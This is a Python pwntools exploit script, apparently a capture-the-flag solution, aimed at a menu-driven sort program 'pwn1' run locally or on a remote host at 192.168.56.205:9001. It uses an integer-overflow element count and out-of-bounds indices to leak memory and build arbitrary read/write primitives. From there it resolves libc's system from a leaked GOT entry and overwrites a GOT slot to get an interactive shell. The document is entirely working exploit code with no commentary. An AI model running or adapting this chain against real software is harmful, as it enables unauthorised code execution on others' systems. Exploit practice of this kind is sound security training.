from pwn import *
import re

if sys.argv[1] == 'l':
	p = process('./pwn1')
elif sys.argv[1] == 'r':
	p = remote('192.168.56.205', 9001)
p.recvuntil('_CMD_$')
p.sendline('sort')
p.recvuntil('sort:')
p.sendline('7')
for i in range(7):
	p.recvuntil('number:')
	p.sendline('1073741828')
p.recvuntil('Menu')
p.sendline('3')
p.recvuntil('Menu')
#leak
p.sendline('1\n7')
data = p.recvuntil('Menu')
print data
pattern = re.compile(r'-?[0-9]+')
ptr = int(pattern.findall( data )[4]) + 4
print 'now struct is based at : ',hex(ptr)
p.sendline('2')
p.recvuntil('index:')
p.sendline('7')
p.recvuntil('number:')
p.sendline(str(ptr))
p.sendline('7')
p.recvuntil('_CMD_$')
p.sendline('reload')
p.sendline('0')
def leak(addr):
	p.recvuntil('Choose')
	ssp = (addr - ptr)/4 - 1
	print 'ssp:',hex(ssp)
	ssp = (0xffffffff&ssp) - 0x7ffffff7 if ssp>0 else (0x3ffffff7+ ssp) & 0xffffffff
	p.sendline('1')
	p.sendline(str(ssp))
	data = p.recvuntil('Menu')
	print data
	cont = (int(pattern.findall( data )[0])&0xffffffff)
	print hex(addr), '->', hex(cont)
	return cont
def write(addr,cont):
	ssp = (addr - ptr)/4 - 1
	ssp = ((0xffffffff&ssp) - 0x3ffffff7) if ssp>0 else (0x3ffffff7+ ssp) & 0xffffffff
	p.sendline('2')
	print ssp
	p.sendline(str(ssp))
	p.recvuntil('number:')
	p.sendline( str(cont) )
	return cont


getchar_got = 0x804D000
getchar = leak(getchar_got)
if sys.argv[1] == 'l':
	base = getchar - 426208
	print '\033[1;31;40m'
	print 'libc base:',hex(base)
	system = base + 241312
	print 'system:',hex(system)
	print '\033[0m'
elif sys.argv[1] == 'r':
	base = getchar - 0x00066a50
	print '\033[1;31;40m'
	print 'libc base:',hex(base)
	system = base + 0x003fcd0
	print 'system:',hex(system)
	print '\033[0m'
leak(0x804D020)
write(0x804D020, system - 0x100000000)


p.interactive()
